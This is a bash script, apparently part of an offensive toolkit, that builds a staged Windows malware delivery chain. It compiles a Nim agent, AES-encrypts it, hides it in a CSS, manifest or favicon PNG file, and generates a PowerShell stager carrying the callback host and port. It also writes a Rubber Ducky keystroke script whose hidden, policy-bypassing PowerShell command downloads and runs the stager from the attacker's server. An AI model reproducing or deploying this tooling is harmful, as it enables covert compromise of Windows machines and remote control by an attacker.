#!/bin/bash

custom_payload_handler() {
  local LHOST="$1"
  local LPORT="$2"
  local WEB_IP="$3"
  local PORT_SERVE="$4"
  local DELIVERY="$5"
  local PROJECT_DIR="$6"
  local OUTPUT_DIR="$7"
  local WEB_DIR="$8"
  local KEY="$9"

  local PAYLOAD_DIR="$PROJECT_DIR/payloads/windows/nim_agent"
  local STAGER_TEMPLATE="$PAYLOAD_DIR/template.ps1"
  local STAGE3_NIM="$PAYLOAD_DIR/stage3.nim"
  local COMPILED_EXE="$OUTPUT_DIR/stage3.exe"
  local TMP_PAYLOAD="$OUTPUT_DIR/tmp_stage3_payload"
  local FINAL_STAGE1="$OUTPUT_DIR/favicon.dat"
  local FINAL_STAGE1_WEB="favicon.dat"

  # Validate files
  [[ -f "$STAGER_TEMPLATE" ]] || { echo "[!] Missing template.ps1"; exit 1; }
  [[ -f "$STAGE3_NIM" ]] || { echo "[!] Missing stage3.nim"; exit 1; }

  # ===============================
  #      COMPILE STAGE 3 (Nim)
  # ===============================
  echo "[*] Compiling stage3.nim to EXE..."
  nim c --app=console --cpu=amd64 --opt=size --out="$COMPILED_EXE" "$STAGE3_NIM" || {
    echo "[!] Nim compilation failed"; exit 1;
  }

  [[ -f "$COMPILED_EXE" ]] || { echo "[!] Compilation did not produce EXE"; exit 1; }

  # ===============================
  #       ENCRYPT STAGE 3 EXE
  # ===============================
  cp "$COMPILED_EXE" "$TMP_PAYLOAD"
  echo "[*] Encrypting compiled EXE..."
  ENCODED=$(python3 "$PROJECT_DIR/tools/encrypt_aes.py" "$TMP_PAYLOAD" "$KEY") || {
    echo "[!] Encryption failed"; rm -f "$TMP_PAYLOAD"; exit 1;
  }
  echo "$ENCODED" > "$OUTPUT_DIR/encrypted_stage2.txt"
  rm -f "$TMP_PAYLOAD"

  # ===============================
  #       EMBED INTO DELIVERY
  # ===============================
  case "$DELIVERY" in
    css)
      python3 "$PROJECT_DIR/tools/embed_in_css.py" "$OUTPUT_DIR/encrypted_stage2.txt" "$WEB_DIR/style.css"
      DELIVERY_FILE="style.css"
      ;;
    manifest)
      python3 "$PROJECT_DIR/tools/embed_in_manifest.py" "$OUTPUT_DIR/encrypted_stage2.txt" "$WEB_DIR/manifest.json"
      DELIVERY_FILE="manifest.json"
      ;;
    png)
      python3 "$PROJECT_DIR/tools/embed_in_png.py" "$OUTPUT_DIR/encrypted_stage2.txt" "$WEB_DIR/favicon.png" "$WEB_DIR/favicon.png"
      DELIVERY_FILE="favicon.png"
      ;;
    *)
      echo "[!] Unknown delivery method"; exit 1
      ;;
  esac

  DELIVERY_URL="http://$WEB_IP:$PORT_SERVE/$DELIVERY_FILE"
  KEY_ESCAPED=$(echo "$KEY" | sed -e 's/[\\/&]/\\\\&/g')

  STAGER_CONTENT=$(sed \
    -e "s|REPLACE_DELIVERY|$DELIVERY|g" \
    -e "s|REPLACE_URL|$DELIVERY_URL|g" \
    -e "s|REPLACE_KEY|$KEY_ESCAPED|g" \
    -e "s|REPLACE_AES|$ENCODED|g" \
    -e "s|REPLACE_IP|$LHOST|g" \
    -e "s|REPLACE_PORT|$LPORT|g" \
    "$STAGER_TEMPLATE")

  if echo "$STAGER_CONTENT" | grep -q 'REPLACE_'; then
    echo "[!] Unreplaced placeholders detected. Abort."
    exit 1
  fi

  echo "$STAGER_CONTENT" > "$FINAL_STAGE1"
  cp "$FINAL_STAGE1" "$WEB_DIR/$FINAL_STAGE1_WEB"

  echo "[+] Windows Stage 1 ready at http://$WEB_IP:$PORT_SERVE/$FINAL_STAGE1_WEB"

  # ===============================
  #       GENERATE DUCKY SCRIPT
  # ===============================
  DUCKY_FILE="$OUTPUT_DIR/ducky_payload.txt"

  cat > "$DUCKY_FILE" <<EOF
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass -Command "iwr http://$WEB_IP:$PORT_SERVE/$FINAL_STAGE1_WEB -OutFile \$env:TEMP\\agent.ps1; powershell -w hidden -ep bypass -File \$env:TEMP\\agent.ps1"
ENTER
EOF

  echo "[+] Ducky payload saved to $DUCKY_FILE"
}
